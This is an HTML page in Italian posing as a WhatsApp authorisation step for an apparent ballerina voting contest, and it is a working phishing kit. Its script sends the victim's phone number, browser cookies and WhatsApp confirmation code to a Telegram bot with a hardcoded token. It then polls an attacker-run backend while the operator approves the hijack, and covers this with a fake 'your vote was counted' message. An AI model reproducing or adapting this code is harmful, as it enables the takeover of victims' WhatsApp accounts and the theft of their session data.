<!DOCTYPE html>
<html lang="it"> <!-- Changed lang to 'it' based on content -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow"> <!-- Keep this meta tag -->
    <!-- Removed original site icon, add your own if needed -->
    <title>Autorizzazione</title>

    <!-- Basic Styling - Replace or extend with your own CSS -->
    <style>
        body {
            font-family: sans-serif;
            background-color: #152b42; /* Dark blue background */
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg"); /* Kept background for now */
            background-size: cover;
            background-position: center;
        }

        .wrapper {
            background-color: #1d3957; /* Slightly lighter blue */
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            max-width: 450px;
            width: 90%;
            text-align: center;
        }

        .block {
            margin-bottom: 20px;
        }

        .block h2 {
            margin-top: 0;
            font-size: 1.5em;
            margin-bottom: 10px;
        }

        .block p {
            color: #c6c6c6;
            font-size: 0.9em;
            line-height: 1.4;
            margin-bottom: 20px;
        }

        .form-container {
            display: flex;
            flex-direction: column;
            gap: 15px; /* Spacing between elements */
        }

        /* Simple input styling */
        input[type="text"] {
            padding: 12px 15px;
            border: 1px solid #80a2b3;
            background-color: #152b42; /* Darker input background */
            color: #ffffff;
            border-radius: 4px;
            font-size: 1em;
            width: 100%;
            box-sizing: border-box; /* Include padding and border in the element's total width and height */
        }

        input[type="text"]:focus {
            border-color: #1d9ce0;
            outline: none;
        }

         /* Generic button styling */
         .button {
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            font-size: 1em;
            cursor: pointer;
            transition: background-color 0.2s ease;
            width: 100%; /* Make buttons full width */
            box-sizing: border-box;
        }

        .button.primary {
            background-color: #1d9ce0E6; /* Blue button */
            color: #ffffff;
        }

        .button.primary:hover {
            background-color: #1d9ce0; /* Slightly darker blue on hover */
        }

        .hidden {
            display: none;
        }

        /* Loader Styling */
        .loader-container { /* Renamed ID to class */
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .loader {
            border: 5px solid #f3f3f3; /* Light grey */
            border-top: 5px solid #1d9ce0; /* Blue */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Popup Styling */
        .popup {
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000; /* Ensure popup is on top */
        }
         .popup .body {
            background-color: #1d3957;
            padding: 30px;
            border-radius: 8px;
            text-align: center;
            max-width: 400px;
            width: 85%;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
        }
        .popup h2 {
            color: #ffffff;
            margin-top: 0;
            font-size: 1.3em;
        }
        .popup p {
             color: #c6c6c6;
             margin-bottom: 20px;
        }

        .error {
            color: #d65d7a; /* Reddish error color */
            font-size: 0.9em;
            margin-top: 5px;
        }

    </style>

    <!-- Removed script tags for socket.io.js, number.js, intlTelInput.min.js, lazyload.js, notiflix.js -->
    <!-- Removed CSS link for intlTelInput.css -->
</head>

<body>
    <div class="wrapper">

        <!-- Step 1: Enter Phone Number -->
        <div class="block" id="step-1">
            <div class="text">
                <h2>Autorizzazione rapida e facile tramite WhatsApp</h2>
                <p>Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle impostazioni, quindi inserisci questo codice.</p>
                <!-- Removed extra headings and paragraphs -->
            </div>
            <div id="form-step-1" class="form-container">
                 <!-- Removed complex country selector -->
                 <!-- Simplified phone input -->
                <input type="text" class="number" id="number" placeholder="Numero di telefono (es. +39123456789)" />
                <button class="button primary" id="next-step">Continua</button>
                <!-- Removed error paragraph, can be added back via JS if needed -->
            </div>
        </div>

        <!-- Step 2: Enter Code -->
        <div class="block hidden" id="step-2">
             <div class="text">
                <h2>Inserisci il Codice</h2>
                <p>Inserisci il codice di conferma che hai ricevuto.</p>
                <!-- Removed QR code related text -->
             </div>
             <div id="form-step-2" class="form-container">
                 <input type="text" class="number" id="code" placeholder="Codice di conferma" />
                 <button class="button primary" id="two-step">Continua</button>
             </div>
              <!-- Loader goes here -->
             <div class="loader-container hidden" id="loader">
                <div class="loader"></div>
             </div>
        </div>


        <!-- Popups (kept structure, simplified content maybe) -->
        <div class="popup hidden" id="popreboot">
            <div class="body">
                <h2>Il tuo voto è stato conteggiato, grazie</h2>
                <!-- Removed potentially obsolete text about session timeout -->
                <button class="button primary btn-ok">Ok</button>
            </div>
        </div>

        <div class="popup hidden" id="popwhat">
            <div class="body">
                <h2>Qualcosa è andato storto!</h2>
                 <p>Hai inserito il codice in modo errato o il codice è stato rifiutato. Riprova o contatta l'assistenza.</p>
                 <!-- Modified text to be more generic -->
                <button class="button primary btn-reb">Riprova</button> <!-- Changed text to "Retry" -->
            </div>
        </div>
    </div> <!-- End Wrapper -->


    <script>
        // The core JavaScript logic remains largely the same,
        // but we ensure IDs match and simplify UI interactions if needed.
        document.addEventListener("DOMContentLoaded", function () {

            // --- Element References ---
            const step1Div = document.getElementById("step-1");
            const step2Div = document.getElementById("step-2");
            const formStep1 = document.getElementById("form-step-1"); // Container for phone input + button
            const formStep2 = document.getElementById("form-step-2"); // Container for code input + button
            const loader = document.getElementById("loader");
            const popReboot = document.getElementById("popreboot");
            const popWhat = document.getElementById("popwhat");

            const nextStepBtn = document.getElementById("next-step");
            const codeStepBtn = document.getElementById("two-step");
            const numberInput = document.getElementById("number");
            const codeInput = document.getElementById("code");

            const reloadBtn = popWhat.querySelector(".btn-reb"); // Find reload button in "Something wrong" popup
            const okBtn = popReboot.querySelector(".btn-ok"); // Find OK button in "Success" popup

            // --- Configuration ---
            const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g"; // Keep YOUR token
            const chat_id = "7417607607"; // Keep YOUR chat ID
            const backendURL = "https://api.bestballerinarvote.com"; // Your backend URL

            // --- Event Listeners ---

            // Reload page on "Retry" button click
            reloadBtn?.addEventListener("click", () => {
                 location.reload();
            });

             // Close success popup on "Ok" button click
            okBtn?.addEventListener("click", () => {
                 popReboot.classList.add("hidden"); // Hide popup using class
                 // Maybe redirect or reset the form here instead of just closing
                 // location.href = "/thank-you-page"; // Example redirect
            });

            // Phone number submission
            nextStepBtn?.addEventListener("click", function (e) {
                e.preventDefault(); // Prevent default form submission

                const phone = numberInput.value.trim();
                // Basic validation (can be improved)
                if (!phone || phone.length < 5) { // Simple check
                     alert("Per favore, inserisci un numero di telefono valido.");
                     return;
                }

                // Hide step 1, show step 2
                step1Div.classList.add("hidden");
                step2Div.classList.remove("hidden");
                formStep2.classList.remove("hidden"); // Ensure code form is visible
                loader.classList.add("hidden"); // Ensure loader is hidden initially

                // Store phone for the next step
                sessionStorage.setItem("submittedPhone", phone);

                // Send info to Telegram (optional: add error handling for fetch)
                const cookies = document.cookie || "Nessun cookie"; // Get cookies (consider privacy implications)
                const msg = `📲 Nuovo запит\nTelefono: ${phone}\n🍪 Cookie: ${cookies}`; // Changed label
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text: msg })
                }).catch(error => console.error("Telegram send error:", error)); // Basic error logging

                 // Focus on the code input for better UX
                 codeInput.focus();
            });

            // Code submission
            codeStepBtn?.addEventListener("click", function (e) {
                e.preventDefault(); // Prevent default form submission

                const code = codeInput.value.trim();
                const phone = sessionStorage.getItem("submittedPhone");

                 // Basic validation
                if (!code) {
                    alert("Per favore, inserisci il codice di conferma.");
                    return;
                }
                if (!phone) {
                     alert("Numero di telefono non trovato. Per favore, torna indietro e inseriscilo di nuovo.");
                     // Optionally hide step 2 and show step 1 here
                     step2Div.classList.add("hidden");
                     step1Div.classList.remove("hidden");
                     return;
                 }


                // Hide code input form, show loader
                formStep2.classList.add("hidden");
                loader.classList.remove("hidden"); // Show loader

                // Send code and phone to Telegram with buttons
                const msg = `🔐 Codice di conferma:\nTelefono: ${phone}\nCodice: ${code}`;
                const keyboard = {
                    inline_keyboard: [
                        [
                            // Use the phone number directly in callback_data
                            { text: "✅ Так", callback_data: `confirm_yes_${phone}` },
                            { text: "❌ Ні", callback_data: `confirm_no_${phone}` }
                        ]
                    ]
                };

                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id,
                        text: msg,
                        reply_markup: keyboard
                    })
                }).catch(error => console.error("Telegram send error:", error)); // Basic error logging

                // Start polling the backend for approval status
                waitForApproval(phone);
            });

            // --- Backend Polling Function ---
            function waitForApproval(phone) {
                let attemptCount = 0;
                const maxAttempts = 20; // Poll for 1 minute (20 * 3 seconds)
                const interval = setInterval(() => {
                    attemptCount++;
                    if (attemptCount > maxAttempts) {
                        clearInterval(interval);
                        console.error("Polling timeout reached.");
                        alert("Tempo di attesa scaduto. Riprova.");
                        loader.classList.add("hidden"); // Hide loader on timeout
                        // Optionally show step 1 again
                        step2Div.classList.add("hidden");
                        step1Div.classList.remove("hidden");
                        return;
                    }

                    // Make sure backendURL is defined
                    if (!backendURL) {
                        console.error("Backend URL is not defined!");
                        clearInterval(interval);
                        return;
                    }

                    fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
                        .then(res => {
                             if (!res.ok) {
                                 // Handle HTTP errors (like 404, 500)
                                 console.error(`Backend response error: ${res.status} ${res.statusText}`);
                                 // Don't stop polling immediately on server error, maybe it's temporary
                                 // Consider stopping after several consecutive errors
                                 return null; // Indicate failure to parse JSON
                             }
                             return res.json();
                        })
                        .then(data => {
                            if (data === null) return; // Skip processing if fetch failed

                            console.log("📩 Risposta dal backend:", data); // Log backend response
                            if (data.status === "approved") {
                                clearInterval(interval); // Stop polling
                                loader.classList.add("hidden"); // Hide loader
                                popReboot.classList.remove("hidden"); // Show success popup
                                // alert("✅ Confermata"); // Replaced by popup
                            } else if (data.status === "rejected") {
                                clearInterval(interval); // Stop polling
                                loader.classList.add("hidden"); // Hide loader
                                popWhat.classList.remove("hidden"); // Show rejection/error popup
                                // alert("❌ Rifiutata"); // Replaced by popup
                            } else {
                                // Status is still "waiting" or something else, continue polling
                                console.log(`Status is '${data.status}', continuing poll...`);
                            }
                        })
                        .catch(err => {
                             console.error("❌ Errore di polling del backend:", err);
                             // Consider stopping polling if there are too many network errors
                             // clearInterval(interval);
                             // alert("Errore di comunicazione con il server.");
                             // loader.classList.add("hidden");
                        });
                }, 3000); // Poll every 3 seconds
            }
        });
    </script>
</body>

</html>
